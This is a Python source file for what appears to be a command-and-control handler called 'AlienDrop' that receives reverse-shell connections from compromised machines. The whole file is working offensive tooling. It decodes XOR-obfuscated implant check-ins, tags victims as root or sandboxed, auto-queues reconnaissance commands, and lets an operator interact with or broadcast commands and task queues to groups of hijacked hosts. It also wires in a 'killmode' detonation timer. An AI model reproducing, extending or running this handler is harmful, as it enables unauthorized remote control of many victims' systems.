# MINC - AlienDrop Operator Handler v5 (Autonomous • Alias-Aware • Task-Dispatching)

import socket
import threading
import base64
import os
import json
from datetime import datetime
from drop_attitudes import get_attitude
import threading, time, subprocess

HOST = '0.0.0.0'
PORT = 5775
AUTH_KEY = "mincpass"

shells = {}
aliases = {}
shell_logs = {}

session_dir = "output/sessions"
auto_task_dir = "auto_tasks"
session_index_file = os.path.join(session_dir, "sessions_index.json")

os.makedirs(session_dir, exist_ok=True)
os.makedirs(auto_task_dir, exist_ok=True)
attitude = get_attitude("killmode")
def trigger_killwave():
    time.sleep(attitude["detonation_timer"])
    subprocess.call(["python3", "handler_kill.py"])

if attitude.get("detonation_timer"):
    threading.Thread(target=trigger_killwave, daemon=True).start
index = {}
if os.path.exists(session_index_file):
    index = json.load(open(session_index_file))

def xor_decode(data, key="alien"):
    raw = base64.b64decode(data)
    return ''.join(chr(b ^ ord(key[i % len(key)])) for i, b in enumerate(raw))

def persist_shell(uuid, data):
    path = os.path.join(session_dir, f"{uuid}.json")
    with open(path, "w") as f:
        json.dump(data, f, indent=2)

def log_output(alias, data):
    log_path = os.path.join(session_dir, f"{alias}.log")
    with open(log_path, "a") as f:
        ts = datetime.now().strftime("[%Y-%m-%d %H:%M:%S] ")
        f.write(ts + data + "\n")

def write_auto_task(uuid, default_lines=None):
    task_path = os.path.join(auto_task_dir, f"{uuid}.task")
    if not os.path.exists(task_path):
        print(f"[~] Auto-creating task queue for {uuid}...")
        with open(task_path, "w") as f:
            f.write("\n".join(default_lines or ["whoami", "id", "uname -a"]))

def client_handler(conn, addr):
    try:
        conn.send(f"$AUTH:{AUTH_KEY}\n".encode())
        intro = conn.recv(2048).decode().strip()
        if "[intro]" in intro:
            decoded = xor_decode(intro.replace("[intro]", "").strip())
            data = eval(decoded) if decoded.startswith("{") else {"uuid": "unknown"}
            uuid = data.get("uuid", addr[0])
            tags = "-".join(data.get("tags", []))
        else:
            uuid = addr[0]
            tags = "unknown"

        # Smart alias assignment
        if "root" in tags:
            alias = f"root_{data.get('host', 'unknown')}"
        elif "sandboxed" in tags:
            alias = f"sandbox_{len(shells)}"
        else:
            alias = f"user_{data.get('host', addr[0])}"
        if alias in shells:
            alias = f"{alias}_{len(shells)}"

        shells[alias] = conn
        aliases[conn] = alias
        shell_logs[alias] = []

        persist_shell(uuid, data)
        write_auto_task(uuid)

        # Indexing session
        index[uuid] = {
            "alias": alias,
            "uuid": uuid,
            "tags": tags,
            "ip": addr[0],
            "host": data.get("host", "?"),
            "user": data.get("user", "?"),
            "arch": data.get("arch", "?"),
            "connected": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }
        with open(session_index_file, "w") as f:
            json.dump(index, f, indent=2)

        print(f"[+] Connected: {alias} ({uuid}) from {addr[0]} with tags: {tags}")
        try:
            conn.send(b"$RELOAD\n")
            print(f"[>] Auto-dispatched $RELOAD to {alias}")
        except:
            pass

        while True:
            output = conn.recv(4096)
            if not output:
                break
            try:
                decoded = xor_decode(output.strip().decode())
            except:
                decoded = output.decode(errors="ignore")
            shell_logs[alias].append(decoded.strip())
            log_output(alias, decoded.strip())
            print(f"\n[{alias}] {decoded.strip()}")

    except Exception as e:
        print(f"[-] Shell connection dropped: {e}")
    finally:
        try:
            conn.close()
        except:
            pass

def start_listener():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((HOST, PORT))
    server.listen(10)
    print(f"[~] Listening on {HOST}:{PORT}...\n")
    while True:
        client, addr = server.accept()
        threading.Thread(target=client_handler, args=(client, addr)).start()

def show_shells():
    print("\n[+] Active Shells:")
    for alias in shells:
        print(f" - {alias}")
    print()

def interact_shell():
    show_shells()
    name = input("[?] Enter shell alias: ").strip()
    if name not in shells:
        print("[-] Shell not found.")
        return
    conn = shells[name]
    print(f"[+] Interacting with {name} (type 'exit' to stop)")
    while True:
        cmd = input(f"{name} $ ").strip()
        if cmd.lower() in ("exit", "quit"):
            break
        if cmd == "":
            continue
        try:
            conn.send(f"{cmd}\n".encode())
            shell_logs[name].append(f"[cmd] {cmd}")
            log_output(name, f"[cmd] {cmd}")
        except:
            print("[-] Shell not responding.")
            break

def show_history():
    show_shells()
    name = input("[?] Enter shell alias for history: ").strip()
    if name in shell_logs:
        print("\n".join(shell_logs[name]))
    else:
        print("[-] Shell not found.")

def rename_shell():
    show_shells()
    old = input("Old alias: ").strip()
    new = input("New alias: ").strip()
    if old in shells:
        shells[new] = shells.pop(old)
        shell_logs[new] = shell_logs.pop(old)
        aliases[shells[new]] = new
        print(f"[+] Renamed {old} to {new}")
    else:
        print("[-] Shell not found.")

def broadcast_cmd():
    tag = input("Tag to broadcast to (e.g., root, internal): ").strip()
    cmd = input(f"[broadcast:{tag}] $ ").strip()
    matched = 0
    for alias, conn in shells.items():
        try:
            profile = os.path.join(session_dir, f"{alias}.log")
            with open(profile) as f:
                content = f.read()
            if tag in content:
                conn.send((cmd + "\n").encode())
                matched += 1
                shell_logs[alias].append(f"[broadcast:{tag}] {cmd}")
                log_output(alias, f"[broadcast:{tag}] {cmd}")
        except:
            continue
    print(f"[+] Broadcasted to {matched} shells with tag '{tag}'")

def write_task(alias):
    if alias not in shells:
        print("[-] Shell not found.")
        return
    uuid_path = os.path.join(session_dir, f"{alias}.log")
    uuid = alias
    try:
        with open(uuid_path) as f:
            for line in f:
                if "uuid" in line:
                    uuid = line.split("uuid")[-1].split()[0].strip()
                    break
    except:
        pass
    path = os.path.join(auto_task_dir, f"{uuid}.task")
    print(f"[~] Creating task queue for {alias} (saved to {uuid}.task)")
    tasks = []
    while True:
        line = input("> ").strip()
        if line.lower() in ["done", "exit", "quit"]:
            break
        tasks.append(line)
    with open(path, "w") as f:
        f.write("\n".join(tasks))
    print(f"[+] Wrote {len(tasks)} tasks to {path}")

def broadcast_task_by_tag():
    tag = input("[tag] Broadcast task to tag: ").strip()
    task_lines = []
    print("[~] Enter task lines (type 'done' to finish):")
    while True:
        line = input("> ").strip()
        if line.lower() in ["done", "exit", "quit"]:
            break
        task_lines.append(line)
    matched = 0
    for alias in shells:
        uuid_path = os.path.join(session_dir, f"{alias}.log")
        try:
            with open(uuid_path) as f:
                content = f.read()
            if tag in content:
                uuid = alias
                task_path = os.path.join(auto_task_dir, f"{uuid}.task")
                with open(task_path, "w") as f:
                    f.write("\n".join(task_lines))
                matched += 1
        except:
            continue
    print(f"[+] Wrote task to {matched} shells with tag '{tag}'")

def menu():
    print("""
AlienDrop Operator Handler 🧠💻

1) List active shells
2) Interact with shell
3) View command history
4) Exit
5) Rename a shell
6) Broadcast command to tag group
7) Write auto-task for a shell
8) Broadcast auto-task to tag group
""")

def shell_menu():
    if len(shells) == 1:
        only = list(shells.keys())[0]
        print(f"[+] One shell detected. Auto-connecting to {only}")
        interact_shell()
    while True:
        menu()
        choice = input("[~] Choice: ").strip()
        if choice == "1":
            show_shells()
        elif choice == "2":
            interact_shell()
        elif choice == "3":
            show_history()
        elif choice == "4":
            print("[-] Goodbye.")
            break
        elif choice == "5":
            rename_shell()
        elif choice == "6":
            broadcast_cmd()
        elif choice == "7":
            show_shells()
            alias = input("Shell alias: ").strip()
            write_task(alias)
        elif choice == "8":
            broadcast_task_by_tag()
        else:
            print("[-] Invalid choice.")

if __name__ == "__main__":
    threading.Thread(target=start_listener, daemon=True).start()
    shell_menu()

